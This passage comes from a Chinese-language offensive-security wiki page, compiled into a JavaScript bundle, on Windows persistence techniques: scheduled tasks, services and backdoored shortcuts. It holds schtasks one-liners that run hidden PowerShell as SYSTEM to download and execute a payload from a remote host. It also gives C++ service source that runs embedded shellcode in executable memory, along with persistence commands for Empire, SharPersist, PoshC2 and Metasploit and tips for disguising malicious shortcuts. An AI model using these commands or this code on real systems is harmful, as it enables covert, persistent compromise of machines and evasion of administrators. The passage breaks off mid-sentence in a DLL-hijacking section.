C:\\Windows\\System32\\cmd.exe\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u8be5\u4efb\u52a1\u5c06\u5728\u6bcf\u4e2aWindows\u767b\u5f55\u4e2d\u4ee5SYSTEM\u7684\u5f62\u5f0f\u4e0b\u8f7d\u5e76\u6267\u884c\u57fa\u4e8ePowerShell\u7684payload\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"schtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onlogon /ru System\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u4e9b\u4e3e\u4f8b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"#(X64) - On System Start\nschtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System\n\n#(X64) - On User Idle (30mins)\nschtasks /create /tn PentestLab /tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30\n\n#(X86) - On User Login\nschtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onlogon /ru System\n\n#(X86) - On System Start\nschtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onstart /ru System\n\n#(X86) - On User Idle (30mins)\nschtasks /create /tn PentestLab /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'\" /sc onidle /i 30\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u670d\u52a1",children:"\u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"\u5728 Windows\u4e0a\u8fd8\u6709\u4e00\u4e2a\u91cd\u8981\u7684\u673a\u5236\uff0c\u4e5f\u5c31\u662f\u670d\u52a1\u3002\u670d\u52a1\u7a0b\u5e8f\u901a\u5e38\u9ed8\u9ed8\u7684\u8fd0\u884c\u5728\u540e\u53f0\uff0c\u4e14\u62e5\u6709 SYSTEM \u6743\u9650\uff0c\u975e\u5e38\u9002\u5408\u7528\u4e8e\u540e\u95e8\u6301\u4e45\u5316\u3002\u6211\u4eec\u53ef\u4ee5\u5c06 EXE /DLL\u7b49\u53ef\u6267\u884c\u6587\u4ef6\u6ce8\u518c\u4e3a\u670d\u52a1\u5b9e\u73b0\u540e\u95e8\u6301\u4e45\u5316\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u521b\u5efa\u670d\u52a1",children:"\u521b\u5efa\u670d\u52a1"}),"\n",(0,r.jsx)(n.h4,{id:"cmd\u76f4\u63a5\u521b\u5efa\u670d\u52a1",children:"CMD\u76f4\u63a5\u521b\u5efa\u670d\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'sc create "SD" binpath= "C:\\Users\\SD\\Desktop\\test.exe"\nsc description "SD" "description" # \u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32\nsc config "SD" start= auto  # \u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8\nnet start "SD" # \u542f\u52a8\u670d\u52a1\n\nsc create pentestlab binpath= "cmd.exe /k C:\\temp\\pentestlab.exe" start="auto" obj="LocalSystem"\nsc start pentestlab\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(23195).A+"",width:"1024",height:"239"})}),"\n",(0,r.jsx)(n.h4,{id:"powershell\u521b\u5efa\u670d\u52a1",children:"Powershell\u521b\u5efa\u670d\u52a1"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'New-Service -Name "pentestlab" -BinaryPathName "C:\\temp\\pentestlab.exe" -Description "PentestLaboratories" -StartupType Automatic\nsc start pentestlab\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(95370).A+"",width:"1024",height:"180"})}),"\n",(0,r.jsx)(n.h4,{id:"\u5176\u4ed6",children:"\u5176\u4ed6"}),"\n",(0,r.jsx)(n.p,{children:"\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7f16\u5199\u4e00\u4e2a\u670d\u52a1,\u7a7f\u63d2\u7740shellcode\u4e0a\u7ebf"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'#include <windows.h>\n#include <iostream>\n\n\nunsigned char buf[] ="\\xfc\\xe8\\x89\\x00\\x00...............................................\\x36\\x38\\x2e\\x31\\x2e\\x31\\x30\\x36\\x00\\x12\\x34\\x56\\x78";\n\n\n#define SLEEP_TIME 5000                          /*\u95f4\u9694\u65f6\u95f4*/\n#define LOGFILE "C:\\\\Windows\\\\log1.txt"              /*\u4fe1\u606f\u8f93\u51fa\u6587\u4ef6*/\n\n\nSERVICE_STATUS ServiceStatus;  /*\u670d\u52a1\u72b6\u6001*/\nSERVICE_STATUS_HANDLE hStatus; /*\u670d\u52a1\u72b6\u6001\u53e5\u67c4*/\n\n\nvoid  ServiceMain(int argc, char** argv);\nvoid  CtrlHandler(DWORD request);\nint   InitService();\n\n\nint main(int argc, CHAR* argv[])\n{\nWCHAR WserviceName[] = TEXT("sddd");\nSERVICE_TABLE_ENTRY ServiceTable[2];\nServiceTable[0].lpServiceName = WserviceName;\nServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;\nServiceTable[1].lpServiceName = NULL;\nServiceTable[1].lpServiceProc = NULL;\nStartServiceCtrlDispatcher(ServiceTable);\n\n\nreturn 0;\n}\n\n\nint WriteToLog(const char* str)\n{\nFILE* pfile;\nfopen_s(&pfile, LOGFILE, "a+");\nif (pfile == NULL)\n{\nreturn -1;\n}\nfprintf_s(pfile, "%s\\n", str);\nfclose(pfile);\n\n\nreturn 0;\n}\n\n\n/*Service initialization*/\nint InitService()\n{\nCHAR Message[] = "Monitoring started.";\nOutputDebugString(TEXT("Monitoring started."));\nint result;\nresult = WriteToLog(Message);\n\n\nreturn(result);\n}\n\n\n/*Control Handler*/\nvoid CtrlHandler(DWORD request)\n{\nswitch (request)\n{\ncase SERVICE_CONTROL_STOP:\n\n\nWriteToLog("Monitoring stopped.");\nServiceStatus.dwWin32ExitCode = 0;\nServiceStatus.dwCurrentState = SERVICE_STOPPED;\nSetServiceStatus(hStatus, &ServiceStatus);\nreturn;\ncase SERVICE_CONTROL_SHUTDOWN:\nWriteToLog("Monitoring stopped.");\n\n\nServiceStatus.dwWin32ExitCode = 0;\nServiceStatus.dwCurrentState = SERVICE_STOPPED;\nSetServiceStatus(hStatus, &ServiceStatus);\nreturn;\ndefault:\nbreak;\n}\n/* Report current status  */\nSetServiceStatus(hStatus, &ServiceStatus);\nreturn;\n}\n\n\nvoid ServiceMain(int argc, char** argv)\n{\nWCHAR WserviceName[] = TEXT("sddd");\nint error;\nServiceStatus.dwServiceType =\nSERVICE_WIN32;\nServiceStatus.dwCurrentState =\nSERVICE_START_PENDING;\n/*\u5728\u672c\u4f8b\u4e2d\u53ea\u63a5\u53d7\u7cfb\u7edf\u5173\u673a\u548c\u505c\u6b62\u670d\u52a1\u4e24\u79cd\u63a7\u5236\u547d\u4ee4*/\nServiceStatus.dwControlsAccepted =\nSERVICE_ACCEPT_SHUTDOWN |\nSERVICE_ACCEPT_STOP;\nServiceStatus.dwWin32ExitCode = 0;\nServiceStatus.dwServiceSpecificExitCode = 0;\nServiceStatus.dwCheckPoint = 0;\nServiceStatus.dwWaitHint = 0;\nhStatus = ::RegisterServiceCtrlHandler(\nWserviceName,\n(LPHANDLER_FUNCTION)CtrlHandler);\nif (hStatus == (SERVICE_STATUS_HANDLE)0)\n{\n\n\nWriteToLog("RegisterServiceCtrlHandler failed");\nreturn;\n}\nWriteToLog("RegisterServiceCtrlHandler success");\n/* Initialize Service   */\nerror = InitService();\nif (error)\n{\n/* Initialization failed  */\nServiceStatus.dwCurrentState =\nSERVICE_STOPPED;\nServiceStatus.dwWin32ExitCode = -1;\nSetServiceStatus(hStatus, &ServiceStatus);\nreturn;\n}\n\n\nLPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nmemcpy(Memory, buf, sizeof(buf));\n((void(*)())Memory)();\n\n\n/*\u5411SCM \u62a5\u544a\u8fd0\u884c\u72b6\u6001*/\nServiceStatus.dwCurrentState =\nSERVICE_RUNNING;\nSetServiceStatus(hStatus, &ServiceStatus);\n\n\n/*do something you want to do in this while loop*/\nMEMORYSTATUS memstatus;\nwhile (ServiceStatus.dwCurrentState ==\nSERVICE_RUNNING)\n{\nchar buffer[16];\nGlobalMemoryStatus(&memstatus);\nint availmb = memstatus.dwAvailPhys / 1024 / 1024;\nsprintf_s(buffer, 100, "available memory is %dMB", availmb);\nint result = WriteToLog(buffer);\nif (result)\n{\nServiceStatus.dwCurrentState = SERVICE_STOPPED;\nServiceStatus.dwWin32ExitCode = -1;\nSetServiceStatus(hStatus,\n&ServiceStatus);\nreturn;\n}\nSleep(SLEEP_TIME);\n}\nWriteToLog("service stopped");\nreturn;\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u5176\u5b9e\u4e5f\u662fpsexec\u7684\u539f\u7406:\u5efa\u7acb\u8fde\u63a5\u540e\u521b\u5efa\u670d\u52a1\u53cd\u5f39shell"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(15227).A+"",width:"1080",height:"657"})}),"\n",(0,r.jsx)(n.p,{children:"\u5220\u9664\u670d\u52a1:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'sc delete "SD"\n'})}),"\n",(0,r.jsx)(n.h4,{id:"\u5176\u4ed6\u7684\u4e00\u4e9b\u5de5\u5177",children:"\u5176\u4ed6\u7684\u4e00\u4e9b\u5de5\u5177"}),"\n",(0,r.jsx)(n.h5,{id:"sharpersist-1",children:"SharPersist"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://github.com/fireeye/SharPersist",children:"https://github.com/fireeye/SharPersist"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'SharPersist -t service -c "C:\\Windows\\System32\\cmd.exe" -a "/c pentestlab.exe" -n "pentestlab" -m add\n'})}),"\n",(0,r.jsx)(n.h5,{id:"powersploit",children:"PowerSploit"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://github.com/PowerShellMafia/PowerSploit",children:"https://github.com/PowerShellMafia/PowerSploit"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'Set-ServiceBinPath -Name pentestlab -binPath "cmd.exe /k C:\\temp\\pentestlab.exe"\nWrite-ServiceBinary -Name pentestlab -Command "cmd.exe /k C:\\temp\\pentestlab.exe"\n'})}),"\n",(0,r.jsx)(n.h5,{id:"poshc2-1",children:"PoshC2"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.a,{href:"https://github.com/nettitude/PoshC2_Python",children:"https://github.com/nettitude/PoshC2_Python"})}),"\n"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"install-servicelevel-persistence\n"})}),"\n",(0,r.jsx)(n.h5,{id:"metasploit-1",children:"Metasploit"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"use post/windows/manage/persistence_exe\nset REXEPATH /tmp/pentestlab.exe\nset SESSION 1\nset STARTUP SERVICE\nset LOCALEXEPATH C:\\\\tmp\nrun\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h3,{id:"telnet\u670d\u52a1",children:"telnet\u670d\u52a1"}),"\n",(0,r.jsx)(n.p,{children:"telnet\u662f\u547d\u4ee4\u884c\u4e0b\u7684\u8fdc\u7a0b\u767b\u5f55\u5de5\u5177\uff0c\u4e0d\u8fc7\u5728\u670d\u52a1\u5668\u7ba1\u7406\u65f6\u4f7f\u7528\u4e0d\u591a\u4e5f\u5e38\u4e3a\u7ba1\u7406\u5458\u6240\u5ffd\u89c6\u3002\u653b\u51fb\u8005\u5982\u679c\u5728\u63a7\u5236\u4e00\u53f0\u670d\u52a1\u5668\u540e\uff0c\u5f00\u542f\u201c\u8fdc\u7a0b\u684c\u9762\u201d\u8fdb\u884c\u8fdc\u7a0b\u63a7\u5236\u975e\u5e38\u5bb9\u6613\u88ab\u7ba1\u7406\u5458\u5bdf\u89c9\uff0c\u4f46\u662f\u542f\u52a8Telnet\u8fdb\u884c\u8fdc\u7a0b\u63a7\u5236\u5374\u4e0d\u5bb9\u6613\u88ab\u5bdf\u89c9\u3002\u4e0d\u8fc7\uff0ctelnet\u7684\u9ed8\u8ba4\u7aef\u53e3\u662f23\uff0c\u5982\u679c\u5f00\u542f\u540e\uff0c\u522b\u4eba\u662f\u5f88\u5bb9\u6613\u626b\u63cf\u5230\u7684\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u4f1a\u66f4\u6539telnet\u7684\u7aef\u53e3\uff0c\u4ece\u800c\u72ec\u4eab\u8be5\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u3002"}),"\n",(0,r.jsx)(n.h2,{id:"\u5feb\u6377\u65b9\u5f0f",children:"\u5feb\u6377\u65b9\u5f0f"}),"\n",(0,r.jsx)(n.h3,{id:"\u4ec0\u4e48\u662flnk",children:"\u4ec0\u4e48\u662fLNK"}),"\n",(0,r.jsx)(n.p,{children:"lnk\u6587\u4ef6\u662f\u7528\u4e8e\u6307\u5411\u5176\u4ed6\u6587\u4ef6\u7684\u4e00\u79cd\u6587\u4ef6\u3002 \u8fd9\u4e9b\u6587\u4ef6\u901a\u5e38\u79f0\u4e3a\u5feb\u6377\u65b9\u5f0f\u6587\u4ef6\uff0c\u901a\u5e38\u5b83\u4ee5\u5feb\u6377\u65b9\u5f0f\u653e\u5728\u786c\u76d8\u4e0a\uff0c\u4ee5\u65b9\u4fbf\u4f7f\u7528\u8005\u5feb\u901f\u7684\u8c03\u7528\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u5229\u7528\u624b\u6cd5",children:"\u5229\u7528\u624b\u6cd5"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u4e3a\u6076\u610f\u8fdb\u7a0b\u521b\u5efa\u5feb\u6377\u65b9\u5f0f\uff0c\u5e76\u5c06\u5176\u52a0\u5165\u542f\u52a8\u7a0b\u5e8f\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5229\u7528\u5f53\u524d\u7528\u6237\u73b0\u6709\u7684\u5feb\u6377\u65b9\u5f0f\u8fdb\u884c\u8ff7\u60d1\uff0c\u8fbe\u5230\u65e2\u80fd\u5f00\u542f\u539f\u7a0b\u5e8f\uff0c\u53c8\u80fd\u6267\u884c\u6076\u610f\u7a0b\u5e8f\u7684\u6548\u679c\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"\u5229\u7528\u8fc7\u7a0b",children:"\u5229\u7528\u8fc7\u7a0b"}),"\n",(0,r.jsx)(n.h4,{id:"\u76f4\u63a5\u4fee\u6539\u653e\u7f6e\u542f\u52a8\u76ee\u5f55",children:"\u76f4\u63a5\u4fee\u6539\uff0c\u653e\u7f6e\u542f\u52a8\u76ee\u5f55"}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u53f3\u952e\u5feb\u6377\u65b9\u5f0f --\x3e \u5c5e\u6027 --\x3e \u76ee\u6807"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714112339757",src:s(92671).A+"",width:"1942",height:"2026"})}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u901a\u8fc7\u66f4\u6539\u56fe\u6807\u6765\u589e\u52a0\u8ff7\u60d1\u6027"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714112646184",src:s(95908).A+"",width:"2298",height:"1780"})}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u6700\u540e\u653e\u5230\u542f\u52a8\u76ee\u5f55\u5373\u53ef"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714112824723",src:s(84741).A+"",width:"1358",height:"318"})}),"\n",(0,r.jsx)(n.h4,{id:"\u540c\u65f6\u542f\u52a8\u4e24\u4e2a\u7a0b\u5e8f",children:"\u540c\u65f6\u542f\u52a8\u4e24\u4e2a\u7a0b\u5e8f"}),"\n",(0,r.jsx)(n.p,{children:"\u81ea\u542f\u52a8\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u6240\u4ee5\u7528\u6237\u5728\u6253\u5f00\u6b63\u5e38\u5e94\u7528\u7684\u65f6\u5019\u5141\u8bb8\u540c\u65f6\u6253\u5f002\u4e2a\u5e94\u7528\uff08\u5305\u542b\u6b63\u5e38\u5e94\u7528\uff09\u7a0d\u5fae\u9690\u853d\u4e00\u70b9\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u91cc\u9700\u8981\u7528\u5230",(0,r.jsx)(n.code,{children:"powershell"}),"\u8fdb\u884c\u8f85\u52a9"]}),"\n",(0,r.jsx)(n.p,{children:"\u4fee\u6539\u76ee\u6807\u503c\u4e3a\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"powershell.exe -c \"invoke-item 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'; invoke-item c:\\windows\\system32\\calc.exe\"\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714113433194",src:s(52524).A+"",width:"1746",height:"1426"})}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u65f6\u70b9\u51fb\u5feb\u6377\u65b9\u5f0f\u5c31\u53ef\u4ee5\u540c\u65f6\u542f\u52a8\u4e24\u4e2a\u5e94\u7528\u4e86\uff0c\u7f3a\u70b9\u5c31\u662f\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u6709\u4e00\u4e2aCMD\u9ed1\u6846"}),"\n",(0,r.jsxs)(n.p,{children:["\u89e3\u51b3\u65b9\u6848\uff1a\u5c5e\u6027\u4e2d\u7684\u8fd0\u884c\u65b9\u5f0f\u9009\u62e9",(0,r.jsx)(n.strong,{children:"\u6700\u5c0f\u5316"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714113628636",src:s(8873).A+"",width:"1294",height:"1970"})}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u65b9\u6848\u4e0d\u8db3\u7684\u70b9\uff0c\u5c31\u662f\u9f20\u6807\u6307\u5411\u56fe\u6807\u65f6\uff0c\u4f1a\u663e\u793apowershell\u8def\u5f84"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210714113808329",src:s(9392).A+"",width:"1530",height:"310"})}),"\n",(0,r.jsx)(n.h3,{id:"\u4e00\u4e9b\u8f85\u52a9\u5de5\u5177",children:"\u4e00\u4e9b\u8f85\u52a9\u5de5\u5177"}),"\n",(0,r.jsx)(n.h4,{id:"empire-1",children:"Empire"}),"\n",(0,r.jsx)(n.p,{children:"Empire\u5305\u542b\u4e00\u4e2a\u6301\u4e45\u6027\u6a21\u5757\uff0c\u8be5\u6a21\u5757\u53ef\u4ee5\u540e\u95e8\u5408\u6cd5\u7684\u5feb\u6377\u65b9\u5f0f\uff08.LNK\uff09\uff0c\u4ee5\u6267\u884c\u4efb\u610f\u7684PowerShellpayload\u3002\u73b0\u6709\u5feb\u6377\u65b9\u5f0f\u7684\u76ee\u6807\u5b57\u6bb5\u5c06\u88ab\u4fee\u6539\u4ee5\u6267\u884c\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u9879\u4e2d\u7684base64\u811a\u672c\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"usemodule persistence/userland/backdoor_lnk\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Empire\u2013\u540e\u95e8\u73b0\u6709\u5feb\u6377\u65b9\u5f0f",src:s(8976).A+"",width:"878",height:"290"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b\u5feb\u6377\u65b9\u5f0f\u7684\u5c5e\u6027\u5c06\u663e\u793a\u76ee\u6807\u5b57\u6bb5\u5df2\u6210\u529f\u4fee\u6539\u4ee5\u6267\u884cPowerShellpayload\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Empire-\u4fee\u6539\u540e\u7684\u5feb\u6377\u65b9\u5f0f",src:s(16022).A+"",width:"751",height:"793"})}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e\u5feb\u6377\u65b9\u5f0f\u5b58\u5728\u4e8e\u542f\u52a8\u6587\u4ef6\u5939\u4e2d\uff0c\u56e0\u6b64\u6682\u5b58\u5668\u5c06\u5728\u4e0b\u4e00\u6b21Windows\u767b\u5f55\u4e2d\u6267\u884c\uff0c\u5e76\u4e14\u5c06\u4e0e\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668\u5efa\u7acb\u8fde\u63a5\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire-\u901a\u8fc7\u5feb\u6377\u65b9\u5f0f\u6210\u529f\u4e0a\u7ebf",src:s(67239).A+"",width:"996",height:"97"})}),"\n",(0,r.jsx)(n.p,{children:"\u4f46\u662f\uff0cEmpire\u5305\u542b\u4e00\u4e2a\u53ef\u7528\u4e8e\u751f\u6210\u5177\u6709LNK\u6587\u4ef6\u683c\u5f0f\u7684\u6682\u5b58\u5668\u7684\u6a21\u5757\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"usestager windows/launcher_lnk\nset Listener http\nexecute\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire-\u521b\u5efa\u5feb\u6377\u65b9\u5f0f",src:s(2359).A+"",width:"724",height:"425"})}),"\n",(0,r.jsx)(n.p,{children:"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6b64\u6a21\u5757\u5c06\u4f7f\u7528\u5199\u5b57\u677f\u56fe\u6807\u4f2a\u88c5\u6210\u53ef\u4fe1\u4efb\u7684\u5e94\u7528\u7a0b\u5e8f\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire-\u5199\u5b57\u677f\u5feb\u6377\u65b9\u5f0f",src:s(41880).A+"",width:"904",height:"447"})}),"\n",(0,r.jsx)(n.p,{children:"\u5feb\u6377\u65b9\u5f0f\u7684\u76ee\u6807\u5b57\u6bb5\u5c06\u4f7f\u7528\u6267\u884cBase64payload\u7684PowerShell\u547d\u4ee4\u586b\u5145\u3002\u53ef\u4ee5\u5c06\u5feb\u6377\u65b9\u5f0f\u8f6c\u79fb\u5e76\u79fb\u52a8\u5230\u542f\u52a8\u6587\u4ef6\u5939\u4e2d\u4ee5\u4fdd\u6301\u6301\u4e45\u6027\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"Empire-\u5feb\u6377\u5c5e\u6027",src:s(70886).A+"",width:"751",height:"861"})}),"\n",(0,r.jsx)(n.h4,{id:"sharpersist-2",children:"SharPersist"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://github.com/fireeye/SharPersist",children:"SharPersist"}),"\u80fd\u591f\u521b\u5efaInternet Explorer\u5feb\u6377\u65b9\u5f0f\uff0c\u8be5\u5feb\u6377\u65b9\u5f0f\u5c06\u6267\u884c\u4efb\u610fpayload\u5e76\u5c06\u5176\u653e\u7f6e\u5728\u542f\u52a8\u6587\u4ef6\u5939\u4e2d\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'SharPersist.exe -t startupfolder -c "cmd.exe" -a "/c C:\\temp\\pentestlab.exe" -f "pentestlab" -m add\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" SharPersist \u2013\u5feb\u6377\u65b9\u5f0f",src:s(42943).A+"",width:"1024",height:"306"})}),"\n",(0,r.jsx)(n.p,{children:"\u5f53\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u65f6\uff0c\u5c06\u6267\u884cpayload\uff0c\u5e76\u6253\u5f00Meterpreter\u4f1a\u8bdd."}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" SharPersist \u2013 Meterpreter",src:s(72110).A+"",width:"721",height:"155"})}),"\n",(0,r.jsx)(n.h4,{id:"poshc2-2",children:"PoshC2"}),"\n",(0,r.jsx)(n.p,{children:"PoshC2\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2aLNK\u6587\u4ef6\u5e76\u5c06\u5176\u76f4\u63a5\u653e\u7f6e\u5728Windows\u542f\u52a8\u6587\u4ef6\u5939\u4e2d\u4ee5\u4fdd\u6301\u6301\u4e45\u6027\u3002\u53ef\u4ee5\u901a\u8fc7\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u6765\u8c03\u7528\u6b64\u6280\u672f\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:"install-persistence 3\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" PoshC2 \u2013\u542f\u52a8LNK\u6587\u4ef6",src:s(66331).A+"",width:"718",height:"190"})}),"\n",(0,r.jsx)(n.p,{children:"\u5728Windows\u767b\u5f55\u671f\u95f4\uff0c\u5feb\u6377\u65b9\u5f0f\u5c06\u5c1d\u8bd5\u5728\u6ce8\u518c\u8868\u9879\u4e0a\u6267\u884c\u503c\uff0c\u8be5\u6ce8\u518c\u8868\u9879\u5305\u542bbase64\u683c\u5f0f\u7684stager\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" PoshC2 \u2013\u5feb\u6377\u65b9\u5f0f",src:s(93).A+"",width:"919",height:"195"})}),"\n",(0,r.jsx)(n.h2,{id:"dll\u52ab\u6301",children:"DLL\u52ab\u6301"}),"\n",(0,r.jsx)(n.h3,{id:"\u4ecb\u7ecd",children:"\u4ecb\u7ecd"}),"\n",(0,r.jsx)(n.p,{children:"DLL\u52ab\u6301\u6f0f\u6d1e\u4e4b\u6240\u4ee5\u88ab\u79f0\u4e3a\u6f0f\u6d1e\uff0c\u8fd8\u8981\u4ece\u8d1f\u8d23\u52a0\u8f7dDLL\u7684\u7cfb\u7edfAPI LoadLibrary \u6765\u770b\u3002\u719f\u6089Windows\u4ee3\u7801\u7684\u540c\u5b66\u90fd\u77e5\u9053\uff0c\u8c03\u2f64 LoadLibrary \u65f6\u53ef\u4ee5\u4f7f\u2f64DLL\u7684\u76f8\u5bf9\u8def\u5f84\u3002\u8fd9\u65f6\uff0c\u7cfb\u7edf\u4f1a\u6309\u7167\u7279\u5b9a\u7684\u987a\u5e8f\u641c\u7d22\u2f00 \u4e9b\u2f6c\u5f55\uff0c\u4ee5\u786e\u5b9aDLL\u7684\u5b8c\u6574\u8def\u5f84\u3002\u6839\u636eMSDN\u2f42\u6863\u7684\u7ea6\u5b9a\uff0c\u5728\u4f7f\u2f64\u76f8\u5bf9\u8def\u5f84\u8c03\u2f64 LoadLibrary \uff08\u540c\u6837\u9002 \u2f64\u4e8e\u5176\u4ed6\u540c\u7c7bDLL LoadLibraryEx\uff0cShellExecuteEx\u7b49\uff09\u65f6\uff0c\u7cfb\u7edf\u4f1a\u4f9d\u6b21\u4ece\u4ee5\u4e0b6\u4e2a\u4f4d\u7f6e\u53bb\u67e5\u627e\u6240\u9700\u8981\u7684 